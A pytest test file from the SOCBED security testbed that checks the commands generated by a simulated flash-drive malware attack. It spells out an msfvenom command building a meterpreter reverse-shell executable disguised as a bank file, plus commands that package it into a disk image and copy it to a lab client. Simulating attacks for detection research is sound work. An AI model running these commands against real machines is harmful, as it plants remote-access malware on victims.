# Copyright 2016-2021 Fraunhofer FKIE
#
# This file is part of SOCBED.
#
# SOCBED is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# SOCBED is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with SOCBED. If not, see <http://www.gnu.org/licenses/>.


from unittest.mock import Mock

import pytest

from attacks import AttackException
from attacks.attack_flashdrive_exe import FlashdriveEXEAttack


@pytest.fixture()
def attack():
    FlashdriveEXEAttack.ssh_client_class = Mock
    return FlashdriveEXEAttack()


class TestFlashdriveEXEAttack:
    def test_generate_exe_command(self, attack: FlashdriveEXEAttack):
        exe_command = attack._generate_exe_command()
        expected_exe_command = (
        	"msfvenom -p windows/x64/meterpreter/reverse_http LHOST=172.18.0.3 "
        	"LPORT=80 -a x64 StagerRetryCount=604800 -f exe-only -o /root/Bank-of-Nuthington.exe")
        assert exe_command == expected_exe_command

    def test_generate_image_commands(self, attack: FlashdriveEXEAttack):
        image_commands = attack._generate_image_commands()
        expected_image_commands = [
            "rm -f /root/evil_image_file.img",
            "dd if=/dev/zero of=/root/evil_image_file.img bs=1024 count=0 seek=$[1024*32]",
            "mkfs.msdos /root/evil_image_file.img",
            "mkdir /media/evil_image/",
            "mount -o loop /root/evil_image_file.img /media/evil_image/",
            "mv /root/Bank-of-Nuthington.exe /media/evil_image/",
            "umount /root/evil_image_file.img"]
        assert image_commands == expected_image_commands

    def test_upload_image_to_client_command(self, attack: FlashdriveEXEAttack):
        upload_command = attack._upload_image_to_client_command()
        expected_upload_command = (
        	"sshpass -p 'breach' scp /root/evil_image_file.img "
        	"ssh@192.168.56.101:/BREACH/ && echo 'Image file successfully sent'")
            
        assert upload_command == expected_upload_command

    def test_raise_exception_bad_output(self, attack: FlashdriveEXEAttack):
        attack.exec_commands_on_target = lambda _: attack.printer.print("Bad output")
        with pytest.raises(AttackException):
            attack.run()

    def test_no_exception_good_output(self, attack: FlashdriveEXEAttack):
        indicator = "Image file successfully sent"
        attack.exec_commands_on_target = lambda _: attack.printer.print(indicator)
        attack.run()
